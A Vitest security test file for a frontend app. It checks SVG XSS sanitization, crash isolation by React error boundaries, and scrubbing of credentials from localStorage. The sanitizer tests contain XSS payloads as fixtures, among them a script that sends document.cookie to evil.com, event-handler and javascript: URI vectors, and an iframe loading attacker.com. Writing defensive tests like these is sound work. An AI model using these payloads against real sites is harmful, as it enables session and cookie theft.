// @vitest-environment jsdom
/**
 * NanoForge Frontend Security Invariants & Adversarial Penetration Test Suite
 * 
 * Challenger 1 Verification:
 * - Invariant 1: Mermaid Diagram XSS Isolation & DOMPurify SVG Sanitization
 * - Invariant 4: React Error Boundaries & Panel Crash Isolation
 * - Invariant 5: In-Memory Credential Isolation & LocalStorage Scrubbing
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import React from "react";
import { render, screen, fireEvent } from "@testing-library/react";

import {
  sanitizeMermaidSvg,
  getPurifier,
} from "../artifacts/MermaidViewer";

import {
  ErrorBoundary,
  AppErrorBoundary,
} from "../ErrorBoundary";

import { loadConnection } from "../../hooks/useConnectionManager";
import {
  loadHostSettings,
  HOST_SETTINGS_KEY,
} from "../../lib/hostSession";

describe("Challenger 1 — Frontend Security Invariants", () => {
  /* ======================================================================== */
  /* Invariant 1: Mermaid Diagram XSS Isolation & DOMPurify SVG Sanitization  */
  /* ======================================================================== */
  describe("Invariant 1: Mermaid Diagram XSS Isolation & SVG Sanitization", () => {
    it("1.1: DOMPurify purifier is available and configured in the environment", () => {
      const purifier = getPurifier();
      expect(purifier).toBeDefined();
      expect(typeof purifier.sanitize).toBe("function");
    });

    it("1.2: Strips raw and nested <script> tag execution vectors", () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
          <g id="flowchart-root">
            <rect width="100" height="50" fill="#222" />
            <script>window.__xss_flag = true; alert("XSS-EXECUTED");</script>
            <script type="text/javascript">document.location="http://evil.com/?c="+document.cookie;</script>
            <text x="10" y="30">Valid Architecture Box</text>
          </g>
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(maliciousSvg);
      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("window.__xss_flag");
      expect(sanitized).not.toContain("XSS-EXECUTED");
      expect(sanitized).not.toContain("evil.com");
      expect(sanitized).toContain("Valid Architecture Box");
      expect(sanitized).toContain("<rect");
    });

    it("1.3: Strips all inline event handlers (onerror, onload, onclick, onmouseover, onfocus, onblur, onmouseenter)", () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" onload="alert('svg_onload')">
          <image href="nonexistent.png" onerror="alert('img_onerror')" />
          <circle cx="50" cy="50" r="20" onclick="alert('circle_click')" onmouseover="alert('hover')" />
          <rect onfocus="alert('focus')" onblur="alert('blur')" onmouseenter="alert('enter')" />
          <path d="M0 0 L10 10" onanimationstart="alert('anim')" />
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(maliciousSvg);
      expect(sanitized).not.toMatch(/\bonload\s*=/i);
      expect(sanitized).not.toMatch(/\bonerror\s*=/i);
      expect(sanitized).not.toMatch(/\bonclick\s*=/i);
      expect(sanitized).not.toMatch(/\bonmouseover\s*=/i);
      expect(sanitized).not.toMatch(/\bonfocus\s*=/i);
      expect(sanitized).not.toMatch(/\bonblur\s*=/i);
      expect(sanitized).not.toMatch(/\bonmouseenter\s*=/i);
      expect(sanitized).not.toMatch(/\bonanimationstart\s*=/i);
      expect(sanitized).not.toContain("alert(");
    });

    it("1.4: Neutralizes javascript: and data:text/html URI exploits in links and image tags", () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <a href="javascript:alert('link_xss')">
            <text>Exploit Link</text>
          </a>
          <a xlink:href="javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>">
            <text>Polyglot Link</text>
          </a>
          <image href="javascript:alert('img_href')" />
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(maliciousSvg);
      expect(sanitized).not.toContain("javascript:alert");
      expect(sanitized).not.toContain("onload=alert");
    });

    it("1.5: Completely purges <foreignObject>, <iframe>, <object>, and <embed> tags", () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <foreignObject width="200" height="200">
            <body xmlns="http://www.w3.org/1999/xhtml">
              <iframe src="http://attacker.com/malicious.html"></iframe>
              <embed src="exploit.swf" />
              <object data="data:text/html,<script>alert(1)</script>"></object>
            </body>
          </foreignObject>
          <text>Clean Architecture Diagram</text>
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(maliciousSvg);
      expect(sanitized).not.toContain("<foreignObject");
      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("<embed");
      expect(sanitized).not.toContain("<object");
      expect(sanitized).toContain("Clean Architecture Diagram");
    });

    it("1.6: Neutralizes SMIL animation event handlers (<animate>, <set> onbegin)", () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="50">
            <animate attributeName="opacity" from="0" to="1" dur="1s" onbegin="alert('smil_xss')" />
            <set attributeName="fill" to="red" onbegin="alert('set_xss')" />
          </rect>
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(maliciousSvg);
      expect(sanitized).not.toMatch(/\bonbegin\s*=/i);
      expect(sanitized).not.toContain("alert('smil_xss')");
      expect(sanitized).not.toContain("alert('set_xss')");
    });

    it("1.7: Retains legitimate SVG structures, styling, gradients, markers, and text", () => {
      const safeSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300">
          <defs>
            <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
              <stop offset="0%" stop-color="#3b82f6" />
              <stop offset="100%" stop-color="#1d4ed8" />
            </linearGradient>
            <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
              <polygon points="0 0, 10 3.5, 0 7" fill="#94a3b8" />
            </marker>
          </defs>
          <g class="nodes">
            <rect x="20" y="20" width="120" height="60" rx="8" fill="url(#g1)" stroke="#60a5fa" stroke-width="2" />
            <text x="80" y="55" text-anchor="middle" fill="#ffffff" font-family="sans-serif" font-size="14">Agent Host</text>
          </g>
        </svg>
      `;

      const sanitized = sanitizeMermaidSvg(safeSvg);
      expect(sanitized).toContain("Agent Host");
      expect(sanitized).toContain("linearGradient");
      expect(sanitized).toContain("marker");
      expect(sanitized).toContain("polygon");
      expect(sanitized).toContain("<rect");
    });
  });

  /* ======================================================================== */
  /* Invariant 4: React Error Boundaries & Fallback UI                        */
  /* ======================================================================== */
  describe("Invariant 4: React Error Boundaries & Fallback UI", () => {
    const originalConsoleError = console.error;
    beforeEach(() => {
      console.error = vi.fn();
    });
    afterEach(() => {
      console.error = originalConsoleError;
    });

    const AdversarialThrower = ({ shouldExplode, message }: { shouldExplode: boolean; message?: string }) => {
      if (shouldExplode) {
        throw new Error(message || "Adversarial Crash in Child Panel");
      }
      return <div data-testid="panel-content">Panel Rendered Successfully</div>;
    };

    it("4.1: ErrorBoundary isolates panel crashes and renders dark fallback UI with panel name", () => {
      const { unmount } = render(
        <div data-testid="main-app">
          <nav data-testid="app-nav">Top Navigation</nav>
          <div data-testid="app-body">
            <ErrorBoundary panelName="Chat Transcript">
              <AdversarialThrower shouldExplode={true} message="Chat Stream Parsing Explosion" />
            </ErrorBoundary>
            <aside data-testid="sidebar-nav">Sidebar Active</aside>
          </div>
        </div>
      );

      // App root and sibling views stay mounted
      expect(screen.getByTestId("main-app")).toBeDefined();
      expect(screen.getByTestId("app-nav")).toBeDefined();
      expect(screen.getByTestId("sidebar-nav")).toBeDefined();

      // ErrorBoundary renders dark fallback card with panel name
      expect(screen.getByText("Chat Transcript Failed to Render")).toBeDefined();
      expect(screen.getByText("Chat Stream Parsing Explosion")).toBeDefined();
      expect(screen.getByRole("button", { name: /retry component/i })).toBeDefined();

      unmount();
    });

    it("4.2: ErrorBoundary supports retry reset and seamless recovery", () => {
      const resetSpy = vi.fn();

      const RecoverableContainer = () => {
        const [hasError, setHasError] = React.useState(true);
        return (
          <ErrorBoundary
            panelName="Subagent Swarm Control Plane"
            onReset={() => {
              resetSpy();
              setHasError(false);
            }}
          >
            {hasError ? (
              <AdversarialThrower shouldExplode={true} message="Topology Graph Render Fault" />
            ) : (
              <AdversarialThrower shouldExplode={false} />
            )}
          </ErrorBoundary>
        );
      };

      const { unmount } = render(<RecoverableContainer />);

      expect(screen.getByText("Subagent Swarm Control Plane Failed to Render")).toBeDefined();

      // Click retry
      const retryBtn = screen.getByRole("button", { name: /retry component/i });
      fireEvent.click(retryBtn);
      expect(resetSpy).toHaveBeenCalledTimes(1);

      // Successfully recovered
      expect(screen.getByTestId("panel-content")).toBeDefined();
      expect(screen.getByText("Panel Rendered Successfully")).toBeDefined();

      unmount();
    });

    it("4.3: AppErrorBoundary provides top-level recovery without white-screen crash", () => {
      const { unmount } = render(
        <AppErrorBoundary>
          <AdversarialThrower shouldExplode={true} message="Fatal Root Exception" />
        </AppErrorBoundary>
      );

      expect(screen.getByText("NanoForge Workbench Crash")).toBeDefined();
      expect(screen.getByText("Fatal Root Exception")).toBeDefined();
      expect(screen.getByRole("button", { name: /try re-mounting/i })).toBeDefined();
      expect(screen.getByRole("button", { name: /reload window/i })).toBeDefined();

      unmount();
    });
  });

  /* ======================================================================== */
  /* Invariant 5: In-Memory Credential Isolation & LocalStorage Scrubbing    */
  /* ======================================================================== */
  describe("Invariant 5: In-Memory Credential Isolation", () => {
    const LS_CONNECTION_KEY = "nanoforge.connection";

    beforeEach(() => {
      localStorage.clear();
    });

    afterEach(() => {
      localStorage.clear();
    });

    it("5.1: Clean loadConnection returns empty in-memory apiKey and configured baseUrl", () => {
      localStorage.setItem(
        LS_CONNECTION_KEY,
        JSON.stringify({ baseUrl: "https://custom.nano-gpt.com/api" })
      );

      const conn = loadConnection();
      expect(conn.apiKey).toBe("");
      expect(conn.baseUrl).toBe("https://custom.nano-gpt.com/api");
      expect(conn.status).toBe("disconnected");
    });

    it("5.2: loadConnection immediately scrubs legacy apiKey from localStorage upon load", () => {
      // Attacker or legacy version placed an API key in localStorage
      localStorage.setItem(
        LS_CONNECTION_KEY,
        JSON.stringify({
          apiKey: "sk-live-ultra-secret-api-key-98765",
          baseUrl: "https://api.nano-gpt.com",
        })
      );

      const conn = loadConnection();
      // Returned in-memory state is scrubbed
      expect(conn.apiKey).toBe("");

      // LocalStorage was actively rewritten to remove apiKey
      const savedInStorage = JSON.parse(localStorage.getItem(LS_CONNECTION_KEY) || "{}");
      expect(savedInStorage.apiKey).toBeUndefined();
      expect(savedInStorage.baseUrl).toBe("https://api.nano-gpt.com");
    });

    it("5.3: loadHostSettings immediately scrubs legacy bearer token from localStorage upon load", () => {
      localStorage.setItem(
        HOST_SETTINGS_KEY,
        JSON.stringify({
          enabled: true,
          port: 4040,
          token: "secret-192bit-bearer-token-in-storage",
        })
      );

      const settings = loadHostSettings();
      expect(settings.enabled).toBe(true);
      expect(settings.port).toBe(4040);
      expect(settings.token).toBeUndefined();

      // LocalStorage was actively sanitized
      const stored = JSON.parse(localStorage.getItem(HOST_SETTINGS_KEY) || "{}");
      expect(stored.token).toBeUndefined();
      expect(stored.enabled).toBe(true);
      expect(stored.port).toBe(4040);
    });
  });
});
